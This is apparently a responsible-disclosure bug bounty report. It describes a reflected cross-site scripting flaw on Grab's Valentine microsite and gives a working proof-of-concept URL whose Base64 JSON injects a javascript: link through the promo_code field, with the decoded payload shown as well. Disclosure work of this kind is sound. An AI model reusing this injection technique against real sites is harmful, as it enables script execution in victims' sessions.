Summary:

Hi,

An encoded injection in the `q` parameter on `my.html` can be used to reflect JavaScript in the `growth.grab.com` context. This microsite creates a "Grab's Valentine" card for a driver over the past year, and carries its data in Base64 format. 

## Proof of concept

Please visit the following URL, scroll down and select the **Copy** button. To demonstrate JavaScript execution, the `growth.grab.com` context will be displayed in a standard alert box.

```
https://growth.grab.com/valentine/active/my.html?q=eyJuYW1lIjogIlRlc3QgSGFja2VyT25lIiwgInN0YXJ0X2RhdGUiOiAiMDEuMDEuMjAxOCIsICJsZWFucGx1bV9pZCI6ICJ0ZXN0IiwgInJpZGVzIjogIjIwMCIsICJwbGFjZXMiOiAiMjAiLCAiZGlzdGFuY2UiOiA1MDAsICJjYW5jZWxfdGltZXMiOiAiMCIsICJkYXlzIjogIjEwMCIsICJwcm9tb19jb2RlIjogImphdmFzY3JpcHQ6Ly9yLmdyYWIuY29tL3Rlc3QlMGFhbGVydChkb2N1bWVudC5kb21haW4pIiwgInByZl9yZXdhcmQiOiAiMTAifQ==
```

The above proof of concept targets the `promo_code` JSON key to inject an unfiltered JavaScript URL which an adversary could craft to be convincingly like a referral address:

```
{"name": "Test HackerOne", "start_date": "01.01.2018", "leanplum_id": "test", "rides": "200", "places": "20", "distance": 500, "cancel_times": "0", "days": "100", "promo_code": "javascript://r.grab.com/test%0aalert(document.domain)", "prf_reward": "10"}
```
### Supporting evidence

{F267789}

## Verified conditions

At the time of testing, I have successfully confirmed exploitability in the following environment:

* Chrome OS 63.0.3239.140 (Official Build) (64-bit)
* Firefox 59.0b7 stable (32-bit) on Windows 10 x64

Thanks,

Yasin

## Impact

An adversary can leverage this vulnerability in a crafted GET request that, if issued by another Growth user, will cause arbitrary JavaScript code to execute within the target's browser in the context of their web session.
